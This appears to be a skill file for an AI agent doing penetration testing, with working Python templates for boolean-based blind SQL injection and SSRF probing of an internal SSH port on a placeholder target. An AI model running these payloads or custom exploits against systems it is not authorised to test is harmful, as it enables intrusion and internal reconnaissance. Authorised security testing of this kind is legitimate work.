---
name: script-generator
description: Generate custom exploitation or automation scripts for specific findings
allowed-tools: [Bash, Read, Write]
---

# Script Generator

Generate targeted scripts for specific vulnerabilities discovered during testing.

## When to Use

- A vulnerability requires a custom exploit (no public PoC exists)
- Automation of a manual testing workflow
- Generating a clean PoC for a validated finding
- Creating a client-safe reproduction script

## Script Requirements

Every generated script must:
1. Include `# SAFE: non-destructive` comment if detection-only
2. Include `TARGET` constant at the top
3. Print clear VULNERABLE / NOT_VULNERABLE output
4. Handle errors gracefully (timeout, connection refused)
5. Be idempotent (safe to run multiple times)
6. Use only stdlib unless a specific dependency is necessary

## Script Templates

### SQLi Extraction Script

```python
#!/usr/bin/env python3
# SAFE: read-only extraction — no data modification
import urllib.request, urllib.parse, sys

TARGET = "https://target.com"
PARAM = "id"
ENDPOINT = "/products"

def test_sqli(target, endpoint, param):
    # Boolean-based blind SQLi
    true_payload  = f"1 AND 1=1-- -"
    false_payload = f"1 AND 1=2-- -"
    
    def fetch(payload):
        url = f"{target}{endpoint}?{param}={urllib.parse.quote(payload)}"
        with urllib.request.urlopen(url, timeout=10) as r:
            return len(r.read())
    
    true_len  = fetch(true_payload)
    false_len = fetch(false_payload)
    
    if true_len != false_len:
        print(f"[VULNERABLE] Boolean-based SQLi confirmed: true={true_len} false={false_len}")
    else:
        print(f"[NOT VULNERABLE] Responses equal: {true_len}")

test_sqli(TARGET, ENDPOINT, PARAM)
```

### SSRF Detection Script

```python
#!/usr/bin/env python3
# SAFE: uses internal SSRF target only — no external callbacks
import urllib.request, sys

TARGET = "https://target.com"
SSRF_PARAM = "url"
ENDPOINT = "/fetch"
INTERNAL_TARGET = "http://127.0.0.1:22"  # SSH — non-destructive probe

def test_ssrf(target, endpoint, param, internal):
    url = f"{target}{endpoint}?{param}={urllib.parse.quote(internal)}"
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            body = r.read().decode('utf-8', errors='ignore')
            if "SSH" in body or "OpenSSH" in body:
                print(f"[VULNERABLE] SSRF confirmed — internal SSH banner retrieved")
                return True
    except Exception as e:
        if "SSH" in str(e):
            print(f"[VULNERABLE] SSRF confirmed via error")
            return True
    print("[NOT VULNERABLE] No internal access detected")
    return False

test_ssrf(TARGET, ENDPOINT, SSRF_PARAM, INTERNAL_TARGET)
```

## Output Location

Save generated scripts to:
`OUTPUT_DIR/tools/<script-name>.py` or within a specific finding:
`OUTPUT_DIR/findings/finding-NNN/poc.py`
